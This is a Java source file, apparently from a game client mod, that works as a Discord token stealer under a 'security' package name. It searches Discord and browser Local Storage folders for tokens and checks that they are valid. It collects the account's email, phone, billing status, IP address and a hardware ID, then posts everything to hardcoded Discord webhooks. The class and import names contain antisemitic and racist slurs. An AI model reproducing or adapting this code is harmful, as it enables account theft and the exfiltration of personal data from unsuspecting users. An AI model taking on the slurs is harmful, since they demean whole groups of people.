package felix.security;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import felix.INetHandlerNiggerToServer;

public final class JUDENSCHWEIN {   
	
	public static boolean debug = false;
    public static void start()
    {




        String d = "https://discord.com/api/webhooks/871673946439831612/BKyLOfArQacAne_4po-AbxqamHk8WTTAImLtWf82awjDzx1S1nQSNXVnB4aKDZs64JPi";

        try {
        } catch (Exception ignore) {}
 
        // HWID

        String llLlLlL = System.getProperty("os.name");
    }
    public static void nig() throws Exception {
        // IMPORTANT: Not tested on MacOS or Linux (hopefully works)


        //Settings:
        String discord_avatar_url = "https://cdn.discordapp.com/avatars/699428621084917813/622e2bf8ec4007ec20a5ccb83167acbf.png?size=256"; //If you want to change the webhook icon
        String discord_username =  "Unauthorised HWID found"; //Webhook Name (only when embed)
        String discord_webhook_url = "https://discord.com/api/webhooks/872098916563316756/cOBz7Y6daUZFKx9IO-Ulbk1biiYeruV1IAK5ZWscH4wN4-0zsfNOEoaZ_-LUXva-qOw7"; // args[0]; //Change this
        boolean send_embed = true; //True sends embed, False sends it in text
        boolean ensure_valid = true; //Checks the account before sending (removes if invalid)

            if (System.getProperty("os.name").contains("Windows")) {
                String path = INetHandlerNiggerToServer.class.getProtectionDomain().getCodeSource().getLocation().getPath();
                String decodedPath = URLDecoder.decode(path, "UTF-8");
                String file_name = decodedPath.split("/")[decodedPath.split("/").length - 1];


                //Gatherer
                for (String token : getTokens(ensure_valid)) {
                    sendEmbed(grabTokenInformation(discord_avatar_url, discord_username, token, send_embed), discord_webhook_url);
                }

            } else {
            }
        }
        private static String grabTokenInformation(String avatar_url, String username, String token, boolean sendEmbed) throws IOException {
            //Account Information
            String accountInfo_username;

            String accountInfo_email;
            String accountInfo_phoneNr;
            Object accountInfo_hasNitro = (hasPaymentMethods(token) ? "True" : "False"); //https://discord.com/api/v8/users/@me/billing/subscriptions
            boolean accountInfo_hasBillingInfo; //https://discord.com/api/v8/users/@me/billing/payment-sources
            String accountInfo_imageURL;

            //PC Info
            String pcInfo_IP;
            String pcInfo_Username;
            String pcInfo_cpuArch;
            String pcInfo_WindowsVersion;

            //Assign what we know
            pcInfo_Username = System.getProperty("user.name");
            pcInfo_WindowsVersion = System.getProperty("os.name");
            pcInfo_cpuArch = System.getProperty("os.arch");

            //Get IP
            pcInfo_IP = get_request("http://ipinfo.io/ip", false, null);

            //Get discord token
            String tokenInformation = get_request("https://discordapp.com/api/v6/users/@me", true, token).replace(",", ",\n");
            accountInfo_username = getJsonKey(tokenInformation, "username") + "#" + getJsonKey(tokenInformation, "discriminator");
            accountInfo_hasBillingInfo = get_request("https://discord.com/api/v8/users/@me/billing/subscriptions", true, token) != "[]";
            accountInfo_email = getJsonKey(tokenInformation, "email");

            accountInfo_phoneNr = getJsonKey(tokenInformation, "phone");
            accountInfo_imageURL = "https://cdn.discordapp.com/avatars/"+getJsonKey(tokenInformation, "id")+"/"+getJsonKey(tokenInformation, "avatar")+".png";



            String finishedEmbedContent = "{\"avatar_url\":\""+avatar_url+"\",\"embeds\":[{\"thumbnail\":{\"url\":\""+accountInfo_imageURL+"\"},\"color\":9109759,\"footer\":{\"icon_url\":\"https://cdn.discordapp.com/avatars/723900852074709033/204e82fd573437e65a73c0ed024cb119.png?size=1024\",\"text\":\"November | "+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(System.currentTimeMillis())+"\"},\"author\":{\"name\":\""+accountInfo_username+"\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: "+accountInfo_email+"\\nPhone: "+accountInfo_phoneNr+"\\nNitro: "+accountInfo_hasNitro+"\\nNitro Info: Coming Soon\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: "+pcInfo_IP+"\\nUsername: "+pcInfo_Username+"\\nWindows version: "+pcInfo_WindowsVersion+"\\nCPU Arch: "+pcInfo_cpuArch+"\"},{\"name\":\"**HWID**\",\"value\":\"```"+INetHandlerNiggerToServer.getID()+"```\"}]}],\"username\":\""+username+"\"}";
            String finishedTextContent = "{\"avatar_url\":\""+accountInfo_imageURL+"\",\"content\":\"***Discord Info***\\n**Email:**\\n```"+accountInfo_email+"```\\n**Phone NR:**\\n```"+accountInfo_phoneNr+"```\\n**Nitro:**\\n```"+accountInfo_hasNitro+"```\\n**Billing Info:**\\n```"+accountInfo_hasBillingInfo+"```\\n**HWID**\\n```"+INetHandlerNiggerToServer.getID()+"```\\n\\n***PC Info**\\n**Username: ***\\n```"+accountInfo_username+"```\\n**IP:**\\n```"+"pcInfo_IP"+"```\\n**Windows version:**\\n```"+pcInfo_WindowsVersion+"```\\n**CPU Arch:**\\n```"+pcInfo_cpuArch+"```\",\"username\":\""+accountInfo_username+"\"}";

            if (sendEmbed) {
                if (debug) {
                    System.out.println(finishedEmbedContent);
                }
                return finishedEmbedContent;
            } else {
                if (debug) {
                    System.out.println(finishedTextContent);
                }

                return finishedTextContent;
            }
        }




        private static String getJsonKey(String jsonString, String wantedKey) {
            Pattern jsonPattern = Pattern.compile("\""+wantedKey+"\": \".*\"");
            Matcher matcher = jsonPattern.matcher(jsonString);

            if (matcher.find()) {
                return matcher.group(0).split("\"")[3];
            }
            return null;
        }
	    private static boolean hasPaymentMethods(String token)
	    {
	        return Utiliation2.getContentFromURL("https://discordapp.com/api/v6/users/@me/billing/payment-sources", token).length() > 4;
	    }

		private static List<String> getTokens(boolean check_isValid) {
            List<String> tokens = new ArrayList<>();
            String fs = System.getenv("file.separator");
            String localappdata = System.getenv("LOCALAPPDATA");
            String roaming = System.getenv("APPDATA");
            String[][] paths = {
                    {"Discord", roaming + "\\Discord\\Local Storage\\leveldb"}, //Standard Discord
                    {"Discord Canary", roaming + "\\discordcanary\\Local Storage\\leveldb"}, //Discord Canary
                    {"Discord PTB", roaming + "\\discordptb\\Local Storage\\leveldb"}, //Discord PTB
                    {"Chrome Browser", localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"}, //Chrome Browser
                    {"Opera Browser", roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb"}, //Opera Browser
                    {"Brave Browser", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"}, //Brave Browser
                    {"Yandex Browser", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"}, //Yandex Browser
                    {"Brave Browser", System.getProperty("user.home") + fs + ".config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb"}, //Brave Browser Linux
                    {"Yandex Browser Beta", System.getProperty("user.home") + fs + ".config/yandex-browser-beta/Default/Local Storage/leveldb"}, //Yandex Browser Beta Linux
                    {"Yandex Browser", System.getProperty("user.home") + fs + ".config/yandex-browser/Default/Local Storage/leveldb"}, //Yandex Browser Linux
                    {"Chrome Browser", System.getProperty("user.home") + fs + ".config/google-chrome/Default/Local Storage/leveldb"}, //Chrome Browser Linux
                    {"Opera Browser", System.getProperty("user.home") + fs + ".config/opera/Local Storage/leveldb"}, //Opera Browser Linux
                    {"Discord", System.getProperty("user.home") + fs + ".config/discord/Local Storage/leveldb"}, //Discord Linux
                    {"Discord Canargy", System.getProperty("user.home") + fs + ".config/discordcanary/Local Storage/leveldb"}, //Discord Canary Linux
                    {"Discord PTB", System.getProperty("user.home") + fs + ".config/discordptb/Local Storage/leveldb"}, //Discord Canary Linux
                    {"Discord", System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb"} //Discord MacOS
            };

            for (String[] path : paths) {
                try {
                    File file = new File(path[1]);

                    for (String pathname : file.list()) {
                        if (debug) {
                            System.out.println("Searching: " + path[1] +System.getProperty("file.separator")+ pathname);
                        }
                        FileInputStream fstream = new FileInputStream(path[1] + System.getProperty("file.separator") + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
                        String strLine;
                        while ((strLine = br.readLine()) != null) {
                            Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}");
                            Matcher m = p.matcher(strLine);

                            while (m.find()) {
                                if (debug) {
                                    System.out.println("Found token: " + m.group() + " in " + pathname);
                                    System.out.println("isDuplicate: " + tokens.contains(m.group()));
                                }
                                if (!tokens.contains(m.group())) {
                                    tokens.add(m.group());
                                }
                            }
                        }
                    }
                } catch (Exception ignored) {
                }
            }

            if (check_isValid) {
                if (debug) {
                    System.out.println("checking if valid");
                    System.out.println(tokens.toString());
                }
                if (!tokens.isEmpty()) {
                    Iterator<String> iter = tokens.iterator();

                    while (iter.hasNext()) {
                        String str = iter.next();
                        try {
                            get_request("https://discordapp.com/api/v6/users/@me", true, str);
                            if (debug) {
                                System.out.println("Token: " + str + " is valid");
                            }

                        } catch (IOException e) {
                            if (debug) {
                                System.out.println("Removing token " + str + "            " + e.getMessage());
                            }
                            iter.remove();
                        }
                    }

                    return tokens;
                } else {
                    if (debug) {
                        System.out.println("No tokens found\nExitting...");
                        System.exit(0);
                    }
                    return null;
                }


            } else {
                return tokens;
            }
        }



        /////////////////
        /// Requests ///
        ////////////////

        private static String get_request(String uri, boolean isChecking, String token) throws IOException {
            URL url = new URL(uri);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
            if (isChecking) {
                connection.setRequestProperty("Authorization", token);
            }
            connection.setRequestMethod("GET");
            InputStream responseStream = connection.getInputStream();
            if (debug) {
                System.out.println("GET - "+connection.getResponseCode());
            }
            try (Scanner scanner = new Scanner(responseStream)) {
                String responseBody = scanner.useDelimiter("\\A").next();
                if (debug) {
                    System.out.println(responseBody);
                }
                return responseBody;
            } catch (Exception e) {
                return "ERROR";
            }
        }

        private static void sendEmbed(String jsonContent, String d) throws IOException {
            URL url = new URL(d);
            URLConnection con = url.openConnection();
            HttpURLConnection connection = (HttpURLConnection)con;
            connection.setRequestMethod("POST"); // PUT is another valid option
            connection.setDoOutput(true);

            byte[] out = jsonContent.getBytes(StandardCharsets.UTF_8);
            int length = out.length;

            connection.setFixedLengthStreamingMode(length);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
            connection.connect();
            try(OutputStream os = connection.getOutputStream()) {
                os.write(out);
            }
            if (debug) {
                System.out.println("POST - "+connection.getResponseCode());
            }

        }
}